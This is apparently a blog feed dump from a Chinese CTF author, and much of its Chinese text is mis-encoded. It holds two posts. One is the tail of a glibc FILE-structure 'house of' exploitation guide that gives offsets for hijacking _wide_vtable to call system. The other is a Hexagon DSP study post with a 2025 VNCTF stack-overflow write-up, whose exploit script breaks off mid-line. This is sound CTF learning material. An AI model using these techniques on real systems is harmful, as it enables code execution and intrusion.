_IO_wdoallocbuf (f);</span><br><span class="line">  _IO_free_wbackup_area (f);</span><br><span class="line">  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è°ƒç”¨<code>_IO_wdoallocbuf (f);</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">     fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span> (_IO_wdoallocbuf)</span><br></pre></td></tr></table></figure><p>è°ƒç”¨äº†<code>(wint_t)_IO_WDOALLOCATE (fp)</code>è¿™ä¸ªå‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è°ƒç”¨çš„æ˜¯<code>_wide_vtable</code>é‡Œçš„<code>__doallocate</code>å‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> </span><br><span class="line">file = &#123;</span><br><span class="line">    _flags = <span class="number">-72537977</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x7f6d399137e3</span> &lt;_IO_2_1_stdout_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0x7f6d399137e4</span> &lt;_IO_2_1_stdout_+<span class="number">132</span>&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">    _markers = <span class="number">0x0</span>,</span><br><span class="line">    _chain = <span class="number">0x7f6d39912a80</span> &lt;_IO_2_1_stdin_&gt;,</span><br><span class="line">    _fileno = <span class="number">1</span>,</span><br><span class="line">    _flags2 = <span class="number">0</span>,</span><br><span class="line">    _old_offset = <span class="number">-1</span>,</span><br><span class="line">    _cur_column = <span class="number">0</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">    _shortbuf = <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">    _lock = <span class="number">0x7f6d39915730</span> &lt;_IO_stdfile_1_lock&gt;,</span><br><span class="line">    _offset = <span class="number">-1</span>,</span><br><span class="line">    _codecvt = <span class="number">0x0</span>,</span><br><span class="line">    _wide_data = <span class="number">0x7f6d39912980</span> &lt;_IO_wide_data_1&gt;,</span><br><span class="line">    _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">    __pad5 = <span class="number">0</span>,</span><br><span class="line">    _mode = <span class="number">-1</span>,</span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x7f6d39914560</span> &lt;__GI__IO_file_jumps&gt;</span><br></pre></td></tr></table></figure><p>æœ‰ä¸€ä¸ª<code>_wide_data</code>ç»“æ„ä½“ï¼Œä¹‹å‰åˆ†æè°ƒç”¨çš„æ˜¯<code>_wide_data</code>çš„<code>wide_vtable</code>é‡Œçš„å‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span></span><br><span class="line"> _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line"> _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line"> _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line"> _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line"> _IO_write_ptr = <span class="number">0x0</span>,</span><br><span class="line"> _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line"> _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line"> _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line"> _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line"> _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line"> _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line"> _IO_state = &#123;</span><br><span class="line">   __count = <span class="number">0</span>,</span><br><span class="line">   __value = &#123;</span><br><span class="line">     __wch = <span class="number">0</span>,</span><br><span class="line">     __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line"> &#125;,</span><br><span class="line"> _IO_last_state = &#123;</span><br><span class="line">   __count = <span class="number">0</span>,</span><br><span class="line">   __value = &#123;</span><br><span class="line">     __wch = <span class="number">0</span>,</span><br><span class="line">     __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line"> &#125;,</span><br><span class="line"> _codecvt = &#123;</span><br><span class="line">   __cd_in = &#123;</span><br><span class="line">     step = <span class="number">0x0</span>,</span><br><span class="line">     step_data = &#123;</span><br><span class="line">       __outbuf = <span class="number">0x0</span>,</span><br><span class="line">       __outbufend = <span class="number">0x0</span>,</span><br><span class="line">       __flags = <span class="number">0</span>,</span><br><span class="line">       __invocation_counter = <span class="number">0</span>,</span><br><span class="line">       __internal_use = <span class="number">0</span>,</span><br><span class="line">       __statep = <span class="number">0x0</span>,</span><br><span class="line">       __state = &#123;</span><br><span class="line">         __count = <span class="number">0</span>,</span><br><span class="line">         __value = &#123;</span><br><span class="line">           __wch = <span class="number">0</span>,</span><br><span class="line">           __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;,</span><br><span class="line">   __cd_out = &#123;</span><br><span class="line">     step = <span class="number">0x0</span>,</span><br><span class="line">     step_data = &#123;</span><br><span class="line">       __outbuf = <span class="number">0x0</span>,</span><br><span class="line">       __outbufend = <span class="number">0x0</span>,</span><br><span class="line">       __flags = <span class="number">0</span>,</span><br><span class="line">       __invocation_counter = <span class="number">0</span>,</span><br><span class="line">       __internal_use = <span class="number">0</span>,</span><br><span class="line">       __statep = <span class="number">0x0</span>,</span><br><span class="line">       __state = &#123;</span><br><span class="line">         __count = <span class="number">0</span>,</span><br><span class="line">         __value = &#123;</span><br><span class="line">           __wch = <span class="number">0</span>,</span><br><span class="line">           __wchb = <span class="string">&quot;\000\000\000&quot;</span></span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;,</span><br><span class="line"> _shortbuf = <span class="string">L&quot;&quot;</span>,</span><br><span class="line"> _wide_vtable = <span class="number">0x7f6d39914020</span> &lt;__GI__IO_wfile_jumps&gt;</span><br></pre></td></tr></table></figure><p>å› æ­¤æœ‰ä»¥ä¸‹åˆ©ç”¨ï¼š</p><ul><li>å°† <code>IO_FILE</code> ä¸­çš„ <code>vtable</code> å­—æ®µæ”¹ä¸º <code>_IO_wfile_jumps</code></li><li>å°† <code>IO_FILE</code> ä¸­çš„ <code>wide_data</code> è®¾ç½®ä¸ºå¯æ§å †åœ°å€ï¼Œç›®çš„æ˜¯æ§åˆ¶ <code>wide_data</code> ä¸­çš„ <code>write_base</code> å’Œ <code>buf_base</code> ä¸º0</li><li>æ§åˆ¶ <code>wide_data-&gt;wide_vtable</code> ä¸ºåœ°å€ <code>A</code>ï¼Œåœ°å€ <code>A</code> æ»¡è¶³ <code>*(A+0x68) == system</code> ï¼ˆæ­¤å¤„çš„ <code>system</code> åœ°å€æ˜¯è‡ªå·±å¸ƒç½®çš„ï¼‰</li></ul><p>æ€»ç»“ä¸‹æ‰§è¡Œåˆ°æœ€åçš„ä½ç½®<strong>éœ€è¦ç»•è¿‡çš„æ£€æŸ¥</strong></p><ol><li><code>_flags</code> è®¾ç½®ä¸º<code>~(2 | 0x8 | 0x800)</code> ï¼Œå¦‚æœæ˜¯éœ€è¦è·å– <code>shell</code> çš„è¯ï¼Œé‚£ä¹ˆå¯ä»¥å°†å‚æ•°å†™ä¸º <code>sh;</code> è¿™æ · <code>_flags</code> æ—¢èƒ½ç»•è¿‡æ£€æŸ¥ï¼Œåˆèƒ½è¢« <code>system</code> å‡½æ•°å½“åšå‚æ•°æˆåŠŸæ‰§è¡Œã€‚éœ€è¦æ³¨æ„çš„æ˜¯ <code>sh;</code> å‰é¢æ˜¯æœ‰ä¸¤ä¸ªç©ºæ ¼çš„ï¼ˆè¿™ä¸ªå€¼æ˜¯ <code>0x3b68732020</code> ï¼‰</li><li><code>_wide_data-&gt;_IO_write_base</code> è®¾ç½®ä¸º <code>0</code> , <code>fp-&gt;_wide_data-&gt;_IO_buf_base</code> è®¾ç½®ä¸º <code>0</code></li><li><code>fp-&gt;_mode == 0</code> å’Œ <code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code> ,è¿™æ ·å³å¯è§¦å‘ <code>_IO_OVERFLOW</code>ã€‚</li></ol><h3 id="ç›¸å…³æŠ€å·§-20"><a href="#ç›¸å…³æŠ€å·§-20" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><p>åˆ©ç”¨<code>_IO_wfile_overflow</code> å‡½æ•°æ§åˆ¶ç¨‹åºæ‰§è¡Œæµæ—¶å¯¹ <code>fp</code> çš„è®¾ç½®å¦‚ä¸‹ï¼š</p><ul><li><code>_flags</code> è®¾ç½®ä¸º <code>~(2 | 0x8 | 0x800)</code>ï¼Œå¦‚æœä¸éœ€è¦æ§åˆ¶ <code>rdi</code>ï¼Œè®¾ç½®ä¸º <code>0</code> å³å¯ï¼›å¦‚æœéœ€è¦è·å¾— <code>shell</code>ï¼Œå¯è®¾ç½®ä¸º<code> sh;</code>ï¼Œæ³¨æ„å‰é¢æœ‰ä¸¤ä¸ªç©ºæ ¼</li><li><code>vtable</code> è®¾ç½®ä¸º<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code> åœ°å€ï¼ˆåŠ å‡åç§»ï¼‰ï¼Œä½¿å…¶èƒ½æˆåŠŸè°ƒç”¨<code>_IO_wfile_overflow</code> å³å¯</li><li><code>_wide_data</code> è®¾ç½®ä¸ºå¯æ§å †åœ°å€ <code>A</code>ï¼Œå³æ»¡è¶³ <code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_write_base</code> è®¾ç½®ä¸º <code>0</code>ï¼Œå³æ»¡è¶³ <code>*(A + 0x18) = 0</code></li><li><code>_wide_data-&gt;_IO_buf_base</code> è®¾ç½®ä¸º <code>0</code>ï¼Œå³æ»¡è¶³ <code>*(A + 0x30) = 0</code></li><li><code>_wide_data-&gt;_wide_vtable</code> è®¾ç½®ä¸ºå¯æ§å †åœ°å€ <code>B</code>ï¼Œå³æ»¡è¶³ <code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> è®¾ç½®ä¸ºåœ°å€ <code>C</code> ç”¨äºåŠ«æŒ <code>RIP</code>ï¼Œå³æ»¡è¶³ <code>*(B + 0x68) = C</code></li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-20"><a href="#åˆ©ç”¨æ•ˆæœ-20" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„å‡½æ•°æ‰§è¡Œ</li></ul><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/">https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;house-ofæ‰‹æ³•&quot;&gt;&lt;a href=&quot;#house-ofæ‰‹æ³•&quot; class=&quot;headerlink&quot; title=&quot;house ofæ‰‹æ³•&quot;&gt;&lt;/a&gt;house ofæ‰‹æ³•&lt;/h1&gt;&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="house of" scheme="http://s1nec-1o.github.io/categories/house-of/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>Hexagonå­¦ä¹ </title>
    <link href="http://s1nec-1o.github.io/2025/02/13/Hexagon%E5%AD%A6%E4%B9%A0/"/>
    <id>http://s1nec-1o.github.io/2025/02/13/Hexagon%E5%AD%A6%E4%B9%A0/</id>
    <published>2025-02-13T07:36:57.000Z</published>
    <updated>2025-02-13T07:39:36.898Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hexagon-å­¦ä¹ "><a href="#Hexagon-å­¦ä¹ " class="headerlink" title="Hexagon å­¦ä¹ "></a>Hexagon å­¦ä¹ </h1><p><strong>Hexagon</strong> æ˜¯é«˜é€šï¼ˆQualcommï¼‰å¼€å‘çš„ <strong>æ•°å­—ä¿¡å·å¤„ç†å™¨ï¼ˆDSPï¼‰</strong> æ¶æ„ï¼Œä¸“ä¸ºç§»åŠ¨è®¾å¤‡ã€ç‰©è”ç½‘å’Œè¾¹ç¼˜è®¡ç®—è®¾è®¡ï¼Œä»¥é«˜æ•ˆèƒ½ã€ä½åŠŸè€—ä¸ºæ ¸å¿ƒä¼˜åŠ¿ã€‚å®ƒè¢«é›†æˆåœ¨é«˜é€šéªé¾™ï¼ˆSnapdragonï¼‰ç³»åˆ—èŠ¯ç‰‡ä¸­</p><ul><li>hexagonç”¨<strong>allocframe</strong>å¼€è¾Ÿæ ˆå¸§ï¼šLRå‹æ ˆï¼ŒFPå‹æ ˆï¼ŒSPå‡å»ä¸€å®šæ•°å€¼å‘ä½åœ°å€å¼€è¾Ÿï¼ŒFPè®¾ç½®æˆæŒ‡å‘æ—§FPçš„æŒ‡é’ˆã€‚deallocframe&#x2F;dealloc_returnç”¨äºé”€æ¯æ ˆå¸§&#x2F;é”€æ¯æ ˆå¸§å¹¶è¿”å›ï¼Œä»æ ˆåº•å–å›FPå’ŒLRã€‚</li></ul><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202502131539009.png" alt="image-20250208213002824" style="zoom: 33%;" /><ul><li>ä¸€å…±æœ‰32ä¸ª32ä½é€šç”¨å¯„å­˜å™¨ï¼Œr0-r31ã€‚å­˜åœ¨å¯„å­˜å™¨å¯¹ï¼Œå¯ä»¥å½“åš64ä½å¯„å­˜å™¨ä½¿ç”¨ï¼Œå¦‚r0å’Œr1å¯ä»¥åˆå¹¶æˆr1:0</li><li>r29-r31æ˜¯åˆ«åå¯„å­˜å™¨ã€‚r29æ˜¯SPï¼Œr30æ˜¯FPï¼Œr31æ˜¯LRå¯„å­˜å™¨ã€‚SPæ˜¯æ ˆé¡¶å¯„å­˜å™¨ï¼ŒFPæ˜¯æ ˆï¼ˆåº•ï¼‰å¯„å­˜å™¨ï¼ŒLRæ˜¯å‚¨å­˜è¿”å›åœ°å€çš„å¯„å­˜å™¨ã€‚</li></ul><p>çœ‹æ±‡ç¼–æ„Ÿè§‰æ˜¯ç±»armæ¶æ„</p><p>ä¸»è¦çš„æ±‡ç¼–æœ‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">allocframe(#0x10) #å¼€è¾Ÿæ ˆç©ºé—´</span><br><span class="line">add(r0,#-0x10) #åŠ å‡ä¹˜é™¤ï¼Œæœ‰è¿”å›å€¼</span><br><span class="line">call func</span><br><span class="line">dealloc_return #pop and ret (ç±»ä¼¼popï¼Œä½†æ˜¯hexagonæ˜¯ä¹ˆæœ‰popæ»´)</span><br><span class="line">memw(r1) #å–æŒ‡é’ˆæŒ‡å‘çš„å†…å®¹</span><br></pre></td></tr></table></figure><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><h3 id="ã€2025VNCTFã€hexagon"><a href="#ã€2025VNCTFã€hexagon" class="headerlink" title="ã€2025VNCTFã€hexagon"></a>ã€2025VNCTFã€hexagon</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00020460</span>                 .global vuln</span><br><span class="line">.text:<span class="number">00020460</span> vuln:                                   <span class="comment">// CODE XREF: main+90â†“p</span></span><br><span class="line">.text:<span class="number">00020460</span>                 &#123; <span class="built_in">allocframe</span>(#<span class="number">0x10</span>) &#125;</span><br><span class="line">.text:<span class="number">00020464</span>                 &#123; r0 = <span class="built_in">add</span>(pc, ##aD@pcrel) &#125; <span class="comment">// &quot;%d&quot;</span></span><br><span class="line">.text:<span class="number">0002046</span>C                 &#123; r1 = <span class="built_in">add</span>(fp, #<span class="number">-0x10</span>) &#125;</span><br><span class="line">.text:<span class="number">00020470</span>                 &#123; call scanf &#125;</span><br><span class="line">.text:<span class="number">00020474</span>                 &#123; r0 = #<span class="number">0</span> &#125;             <span class="comment">// fd</span></span><br><span class="line">.text:<span class="number">00020478</span>                 &#123; r1 = <span class="built_in">add</span>(fp, #<span class="number">-8</span>) &#125;   <span class="comment">// buf</span></span><br><span class="line">.text:<span class="number">0002047</span>C                 &#123; r2 = #<span class="number">0x10</span> &#125;          <span class="comment">// nbytes</span></span><br><span class="line">.text:<span class="number">00020480</span>                 &#123; call read &#125;</span><br><span class="line">.text:<span class="number">00020484</span>                 &#123; r0 = <span class="built_in">add</span>(pc, ##aCatHomeCtfLog@pcrel) &#125; <span class="comment">// &quot;cat /home/ctf/log&quot;</span></span><br><span class="line">.text:<span class="number">0002048</span>C                 &#123; call system &#125;</span><br><span class="line">.text:<span class="number">00020490</span>                 &#123; nop</span><br><span class="line">.text:<span class="number">00020494</span>                   nop</span><br><span class="line">.text:<span class="number">00020498</span>                   nop</span><br><span class="line">.text:<span class="number">0002049</span>C                   dealloc_return &#125;</span><br><span class="line">.text:<span class="number">0002049</span>C <span class="comment">// End of function vuln</span></span><br></pre></td></tr></table></figure><p>å‘ç°allocframeåªå¼€è¾Ÿäº†0x10ä¸ªå­—èŠ‚çš„æ ˆç©ºé—´ï¼Œç„¶åreadçš„èµ·å§‹åœ°å€æ˜¯ä»fp-8å¼€å§‹çš„ï¼Œå†ç»“åˆ32ä½çš„4å­—èŠ‚åœ°å€ï¼Œæ˜¾ç„¶æœ‰æ ˆæº¢å‡º8ä¸ªå­—èŠ‚ï¼Œæº¢å‡ºåˆ°FPå’ŒLRçš„å­˜å‚¨ç©ºé—´ï¼Œè€ŒLRæ˜¯å­˜å–è¿”å›åœ°å€çš„ï¼Œä¾¿æœ‰åŠ«æŒè¿”å›åœ°å€ã€‚</p><h4 id="è§£æ³•1-systemæ‰§è¡Œ"><a href="#è§£æ³•1-systemæ‰§è¡Œ" class="headerlink" title="è§£æ³•1-systemæ‰§è¡Œ"></a>è§£æ³•1-systemæ‰§è¡Œ</h4><p>çœ‹äº†å®˜æ–¹wpä¹‹å</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202502131539011.png" alt="image-20250210142817772"></p><p>ä»libc.soä¸­æ‰¾åˆ°systemï¼Œå‘ç°ååº•å±‚çš„systemå®ç°æ–¹å¼æ˜¯é€šè¿‡posix_spawnè¿›ç¨‹åˆ›å»ºå‡½æ•°ï¼ˆç†è§£ä¸ºfork+execveå³å¯ï¼‰ï¼Œé€šè¿‡å¯¹å‚æ•°çš„ç®€å•åˆ†æï¼Œå¯ä»¥çŸ¥é“r1&#x3D;â€&#x2F;bin&#x2F;shâ€ï¼Œç„¶åargv[] &#x3D; {â€œshâ€, â€œ-câ€, user_input, NULL};ï¼Œè€Œè¿™ä¸ªusr_inputæ˜¯é€šè¿‡fp-0x10è¾“å…¥çš„ï¼Œè¯¦æƒ…è‡ªè¡ŒæŸ¥çœ‹posix_spawnçš„å‚æ•°</p><p>ç„¶åå›åˆ°é¢˜ç›®å‘ç°ä¸€å¼€å§‹æœ‰ä¸€ä¸ªscanfå‡½æ•°æ˜¯è¾“å…¥fp-0x10çš„ï¼Œé‚£ä¹ˆå±€åŠ¿å°±å¾ˆæ˜æœ—äº†ï¼ŒåŒæ—¶ç”±äºqemuçš„libcæ˜¯ä¸ä¼šæ”¹å˜çš„ï¼Œå› æ­¤ä¼ å…¥ä¸€ä¸ª&#x2F;bin&#x2F;shçš„åœ°å€å°±è¡Œå•¦</p><p>libcåœ°å€çš„å¯»æ‰¾ï¼š</p><p>è¿™é‡Œæ˜¯é€šè¿‡æ—¥å¿—æ¥å¯»æ‰¾çš„</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set_tid_address</span>(<span class="number">1073672412</span>,<span class="number">1073672412</span>,<span class="number">-4</span>,<span class="number">0</span>,<span class="number">1072439316</span>,<span class="number">67108864</span>) = <span class="number">7</span></span><br></pre></td></tr></table></figure><p>è€Œè¿™ä¸ª1073672412æ˜¯æŒ‡é’ˆåœ°å€ï¼Œé€šå¸¸ç”±libcåˆ†é…çš„å­˜å‚¨tidï¼ˆçº¿ç¨‹idï¼‰çš„ï¼Œä»libcä¸­å¯»æ‰¾åˆ°å¯¹åº”çš„ç»“æ„ä½“</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:<span class="number">0012F</span>0DC __thread_list_lock:.space <span class="number">1</span>             <span class="comment">// DATA XREF: __init_tp+70â†‘o</span></span><br><span class="line">.bss:<span class="number">0012F</span>0DC                                         <span class="comment">// __post_Fork+28â†‘o ...</span></span><br><span class="line">.bss:<span class="number">0012F</span>0DD                 .space <span class="number">1</span></span><br><span class="line">.bss:<span class="number">0012F</span>0DE                 .space <span class="number">1</span></span><br><span class="line">.bss:<span class="number">0012F</span>0DF                 .space <span class="number">1</span></span><br></pre></td></tr></table></figure><p>ç›¸å‡è·å¾—libc_base&#x3D;0x3FEC0000ï¼ˆç®—æ˜¯å–å·§å§ï¼Œå› ä¸ºæˆ‘çš„qemuå•æ­¥æ‰§è¡Œåæ‰å•¦&#x2F;(ã„’oã„’)&#x2F;~~ï¼‰</p><p>æœ¬åœ°ç¯å¢ƒä¸è¿œç¨‹æœ‰å·®è·ï¼Œä¸è¿‡æ–¹æ³•ç±»ä¼¼</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="built_in">process</span>([<span class="string">&#x27;qemu-hexagon&#x27;</span> , <span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;in_asm,exec,cpu,nochain&#x27;</span>, <span class="string">&#x27;-strace&#x27;</span>, <span class="string">&#x27;-dfilter&#x27;</span>, <span class="string">&#x27;0x20420+0xc0&#x27;</span>, <span class="string">&#x27;-D&#x27;</span>, <span class="string">&#x27;./log&#x27;</span>, <span class="string">&#x27;./main&#x27;</span>])</span><br><span class="line">libc_base=<span class="number">0x40810000</span></span><br><span class="line">fp=<span class="number">0x4080f078</span></span><br><span class="line">binsh = libc_base+<span class="number">0x119f7</span></span><br><span class="line"><span class="built_in">ru</span>(b<span class="number">&#x27;</span>\n<span class="number">&#x27;</span>)</span><br><span class="line"><span class="built_in">sl</span>(<span class="built_in">tbs</span>(binsh))</span><br><span class="line">payload = <span class="built_in">p32</span>(<span class="number">0</span>)*<span class="number">2</span>+<span 